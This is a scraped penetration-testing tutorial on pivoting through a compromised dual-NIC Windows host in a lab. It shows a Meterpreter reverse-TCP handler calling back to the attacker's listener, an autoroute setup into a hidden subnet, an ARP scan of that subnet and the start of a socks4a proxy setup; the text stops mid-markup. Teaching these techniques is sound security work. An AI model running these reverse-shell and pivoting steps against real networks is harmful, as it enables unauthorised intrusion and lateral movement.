<p>Basically, it is the process of accessing networks that we do not have access to under normal circumstances by using compromised computers.&nbsp;Network isolation will be useless in case of compromise a computer that has a access to the multiple. With this method, an attacker who performs routing on the compromised systems can access the hidden networks. Every request to be made to the newly discovered network is transmitted over the Pivot. It’s like a kind of tunnel.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-524" src="https://pentest.blog/wp-content/uploads/3.png" alt="" width="785" height="364" srcset="https://pentest.blog/wp-content/uploads/3.png 785w, https://pentest.blog/wp-content/uploads/3-300x139.png 300w, https://pentest.blog/wp-content/uploads/3-768x356.png 768w" sizes="(max-width: 785px) 100vw, 785px"></p>
<p>As seen in the above topology, the device that has two NICs has access to the both <strong>192.168.1.0/24</strong> and <strong>192.168.10.0/24</strong> networks. Under normal circumstances there is no access between these two networks -unless a routing rule is defined. According to this structure, the authorized user, who is using the computer with two NIC cards, has to access some services in the DMZ.</p>
<h3>Compromise First Pivot and Port Forwarding</h3>
<p>According to our attack scenario, meterpreter shell obtained in the system named as RD is also&nbsp;connected to the DMZ network. Later, it is determined that the target has two NICs with the information gathering process.</p>
<p><strong>Note:</strong> The router in the environment does not route between networks.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-541" src="https://pentest.blog/wp-content/uploads/first.png" alt="" width="459" height="258" srcset="https://pentest.blog/wp-content/uploads/first.png 459w, https://pentest.blog/wp-content/uploads/first-300x169.png 300w" sizes="(max-width: 459px) 100vw, 459px"></p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> use exploit/multi/handler </span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">handler</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set payload windows/meterpreter/reverse_tcp</span></div></div><div class=""><div><span class="enlighter-text">payload =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> windows/meterpreter/reverse_tcp</span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">handler</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set LHOST </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text">LHOST =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">handler</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> set LPORT </span><span class="enlighter-n1">1234</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">LPORT =</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-n1">1234</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">exploit</span><span class="enlighter-g1">(</span><span class="enlighter-text">handler</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Started reverse TCP handler on </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1234</span><span class="enlighter-text"> </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Starting the payload handler...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Sending </span><span class="enlighter-m0">stage</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n1">957487</span><span class="enlighter-text"> bytes</span><span class="enlighter-g1">)</span><span class="enlighter-text"> to </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">11</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Meterpreter session </span><span class="enlighter-n1">2</span><span class="enlighter-text"> </span><span class="enlighter-m0">opened</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">20</span><span class="enlighter-text">:</span><span class="enlighter-n1">1234</span><span class="enlighter-text"> -</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">11</span><span class="enlighter-text">:</span><span class="enlighter-n1">49162</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> ifconfig</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Interface  </span><span class="enlighter-n1">1</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">============</span></div></div><div class=""><div><span class="enlighter-text">Name         </span><span class="enlighter-g0">:</span><span class="enlighter-text"> Software Loopback Interface </span><span class="enlighter-n1">1</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Hardware MAC </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">MTU          </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">4294967295</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Address </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n0">127.0</span><span class="enlighter-text">.</span><span class="enlighter-n0">0.1</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Netmask </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n0">255.0</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-n1">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv6 Address </span><span class="enlighter-g0">:</span><span class="enlighter-text"> ::</span><span class="enlighter-n1">1</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv6 Netmask </span><span class="enlighter-g0">:</span><span class="enlighter-text"> ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Interface </span><span class="enlighter-n1">11</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">============</span></div></div><div class=""><div><span class="enlighter-text">Name         </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-m0">Intel</span><span class="enlighter-g1">(</span><span class="enlighter-text">R</span><span class="enlighter-g1">)</span><span class="enlighter-text"> PRO/</span><span class="enlighter-n1">1000</span><span class="enlighter-text"> MT Desktop Adapter</span></div></div><div class=""><div><span class="enlighter-text">Hardware MAC </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:e1:3f:af</span></div></div><div class=""><div><span class="enlighter-text">MTU          </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">1500</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Address </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">11</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Netmask </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Interface </span><span class="enlighter-n1">19</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">============</span></div></div><div class=""><div><span class="enlighter-text">Name         </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-m0">Intel</span><span class="enlighter-g1">(</span><span class="enlighter-text">R</span><span class="enlighter-g1">)</span><span class="enlighter-text"> PRO/</span><span class="enlighter-n1">1000</span><span class="enlighter-text"> MT Desktop Adapter </span><span class="enlighter-c0">#2</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Hardware MAC </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:7f:3c:fe</span></div></div><div class=""><div><span class="enlighter-text">MTU          </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n1">1500</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Address </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.11</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">IPv4 Netmask </span><span class="enlighter-g0">:</span><span class="enlighter-text"> </span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span></div></div></div><div class="enlighter-raw">msf &gt; use exploit/multi/handler 
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set LHOST 172.16.0.20 
LHOST =&gt; 172.16.0.20
msf exploit(handler) &gt; set LPORT 1234
LPORT =&gt; 1234
msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 172.16.0.20:1234 
[*] Starting the payload handler...
[*] Sending stage (957487 bytes) to 172.16.0.11
[*] Meterpreter session 2 opened (172.16.0.20:1234 -&gt; 172.16.0.11:49162)

meterpreter &gt; ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 11
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:e1:3f:af
MTU          : 1500
IPv4 Address : 172.16.0.11
IPv4 Netmask : 255.255.255.0



Interface 19
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:7f:3c:fe
MTU          : 1500
IPv4 Address : 7.7.7.11
IPv4 Netmask : 255.255.255.0</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">msf &gt; use exploit/multi/handler 
msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp
payload =&gt; windows/meterpreter/reverse_tcp
msf exploit(handler) &gt; set LHOST 172.16.0.20 
LHOST =&gt; 172.16.0.20
msf exploit(handler) &gt; set LPORT 1234
LPORT =&gt; 1234
msf exploit(handler) &gt; run

[*] Started reverse TCP handler on 172.16.0.20:1234 
[*] Starting the payload handler...
[*] Sending stage (957487 bytes) to 172.16.0.11
[*] Meterpreter session 2 opened (172.16.0.20:1234 -&gt; 172.16.0.11:49162)

meterpreter &gt; ifconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 11
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter
Hardware MAC : 08:00:27:e1:3f:af
MTU          : 1500
IPv4 Address : 172.16.0.11
IPv4 Netmask : 255.255.255.0



Interface 19
============
Name         : Intel(R) PRO/1000 MT Desktop Adapter #2
Hardware MAC : 08:00:27:7f:3c:fe
MTU          : 1500
IPv4 Address : 7.7.7.11
IPv4 Netmask : 255.255.255.0


</pre>
<p>According to our scenario, the attacker who gains access to the <strong>RD</strong> system will want to access the network with the second NIC (7.7.7.0/24). The attacker must first define the routing rule on RD to do this operation.</p>
<p>It is quite easy to do this with Metasploit. The following command can be used to create the routing rule via the current meterpreter session.</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run autoroute -s </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.0</span><span class="enlighter-text">/</span><span class="enlighter-n1">24</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Adding a route to </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.0</span><span class="enlighter-text">/</span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">...</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">+</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Added route to </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.0</span><span class="enlighter-text">/</span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text"> via </span><span class="enlighter-n0">172.16</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">11</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Use the -p option to list all active routes</span></div></div><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run autoroute -p</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Active Routing Table</span></div></div><div class=""><div><span class="enlighter-text">====================</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"> Subnet Netmask Gateway</span></div></div><div class=""><div><span class="enlighter-text"> ------ ------- -------</span></div></div><div class=""><div><span class="enlighter-text"> </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.0</span><span class="enlighter-text"> </span><span class="enlighter-n0">255.255</span><span class="enlighter-text">.</span><span class="enlighter-m3">255</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text"> Session </span><span class="enlighter-n1">2</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span></div></div></div><div class="enlighter-raw">meterpreter &gt; run autoroute -s 7.7.7.0/24
[*] Adding a route to 7.7.7.0/255.255.255.0...
[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11
[*] Use the -p option to list all active routes
meterpreter &gt; run autoroute -p

Active Routing Table
====================

 Subnet Netmask Gateway
 ------ ------- -------
 7.7.7.0 255.255.255.0 Session 2

meterpreter &gt;</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">meterpreter &gt; run autoroute -s 7.7.7.0/24
[*] Adding a route to 7.7.7.0/255.255.255.0...
[+] Added route to 7.7.7.0/255.255.255.0 via 172.16.0.11
[*] Use the -p option to list all active routes
meterpreter &gt; run autoroute -p

Active Routing Table
====================

 Subnet Netmask Gateway
 ------ ------- -------
 7.7.7.0 255.255.255.0 Session 2

meterpreter &gt;</pre>
<p>According to the defined rule; As long as the meterpreter session with ID value 2 is running, the 7.7.7.0/24 network can be accessed in the Metasploit Framework.</p>
<p>After this step, the IP addresses of the JC system is detected using post modules such as <strong>arp_scanner</strong>. JC is another computer found in hidden network -7.7.7.20-</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> run post/windows/gather/arp_scanner RHOSTS=</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.0</span><span class="enlighter-text">/</span><span class="enlighter-n1">24</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Running module against DISCORDIA</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> ARP Scanning </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.0</span><span class="enlighter-text">/</span><span class="enlighter-n1">24</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text">     IP: </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.11</span><span class="enlighter-text"> MAC </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:7f:3c:</span><span class="enlighter-m0">fe</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">CADMUS COMPUTER SYSTEMS</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text">     IP  </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.12</span><span class="enlighter-text"> MAC </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:3a:b2:</span><span class="enlighter-m0">c1</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">CADMUS CIMPUTER SYSTEMS</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text">     IP: </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.20</span><span class="enlighter-text"> MAC </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:fa:a0:</span><span class="enlighter-m0">c5</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">CADMUS COMPUTER SYSTEMS</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text">     IP: </span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-m3">7</span><span class="enlighter-text">.</span><span class="enlighter-n0">7.255</span><span class="enlighter-text"> MAC </span><span class="enlighter-n1">08</span><span class="enlighter-text">:</span><span class="enlighter-n4">00</span><span class="enlighter-text">:</span><span class="enlighter-n1">27</span><span class="enlighter-text">:3f:2a:</span><span class="enlighter-m0">b5</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">CADMUS COMPUTER SYSTEMS</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> </span></div></div></div><div class="enlighter-raw">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=7.7.7.0/24

[*] Running module against DISCORDIA
[*] ARP Scanning 7.7.7.0/24
[*]     IP: 7.7.7.11 MAC 08:00:27:7f:3c:fe (CADMUS COMPUTER SYSTEMS)
[*]     IP  7.7.7.12 MAC 08:00:27:3a:b2:c1 (CADMUS CIMPUTER SYSTEMS)
[*]     IP: 7.7.7.20 MAC 08:00:27:fa:a0:c5 (CADMUS COMPUTER SYSTEMS)
[*]     IP: 7.7.7.255 MAC 08:00:27:3f:2a:b5 (CADMUS COMPUTER SYSTEMS)

meterpreter &gt; </div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-linenumbers="false">meterpreter&nbsp;&gt;&nbsp;run&nbsp;post/windows/gather/arp_scanner&nbsp;RHOSTS=7.7.7.0/24

[*]&nbsp;Running&nbsp;module&nbsp;against&nbsp;DISCORDIA
[*]&nbsp;ARP&nbsp;Scanning&nbsp;7.7.7.0/24
[*]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP:&nbsp;7.7.7.11&nbsp;MAC&nbsp;08:00:27:7f:3c:fe&nbsp;(CADMUS&nbsp;COMPUTER&nbsp;SYSTEMS)
[*]     IP  7.7.7.12 MAC 08:00:27:3a:b2:c1 (CADMUS CIMPUTER SYSTEMS)
[*]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP:&nbsp;7.7.7.20&nbsp;MAC&nbsp;08:00:27:fa:a0:c5&nbsp;(CADMUS&nbsp;COMPUTER&nbsp;SYSTEMS)
[*]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP:&nbsp;7.7.7.255&nbsp;MAC&nbsp;08:00:27:3f:2a:b5 (CADMUS&nbsp;COMPUTER&nbsp;SYSTEMS)

meterpreter &gt; 
</pre>
<p>IP addresses of live systems in 7.7.7.0/24 network, including JC named system, have been determined.</p>
<p><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-568" src="https://pentest.blog/wp-content/uploads/2_yesilli.png" alt="" width="701" height="260" srcset="https://pentest.blog/wp-content/uploads/2_yesilli.png 701w, https://pentest.blog/wp-content/uploads/2_yesilli-300x111.png 300w" sizes="(max-width: 701px) 100vw, 701px"></p>
<p>Naturally, the following question will come to mind; Post modules such as arp_scanner may be insufficient for such scanning work, can <strong>nmap</strong> style scanning tools be used?</p>
<h4>Nmap via Pivoting</h4>
<p>In order to do this, the routing configuration must be active on Metasploit, and this configuration must also be able to be forwarded via socks4 proxy. There is another metasploit module that also meets this need.</p>
<p>Use of socks4 proxy as metasploit module:</p>
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-generic enlighter-hover "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">meterpreter </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> background </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">[</span><span class="enlighter-text">*</span><span class="enlighter-g1">]</span><span class="enlighter-text"> Backgrounding session </span><span class="enlighter-n0">2.</span><span class="enlighter-text">..</span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> use auxiliary/server/socks4a </span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span class="enlighter-text">socks4a</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">&gt;</span><span class="enlighter-text"> show options </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Module </span><span class="enlighter-m0">options</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">auxiliary/server/socks4a</span><span class="enlighter-g1">)</span><span class="enlighter-text">:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Name     Current Setting  Required  Description</span></div></div><div class=""><div><span class="enlighter-text">   ----     ---------------  --------  -----------</span></div></div><div class=""><div><span class="enlighter-text">   SRVHOST  </span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-m3">0</span><span class="enlighter-text">.</span><span class="enlighter-n1">0</span><span class="enlighter-text">          yes       The address to listen on</span></div></div><div class=""><div><span class="enlighter-text">   SRVPORT  </span><span class="enlighter-n1">1080</span><span class="enlighter-text">             yes       The port to listen on.</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">Auxiliary action:</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">   Name   Description</span></div></div><div class=""><div><span class="enlighter-text">   ----   -----------</span></div></div><div class=""><div><span class="enlighter-text">   Proxy  </span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">msf </span><span class="enlighter-m0">auxiliary</span><span class="enlighter-g1">(</span><span 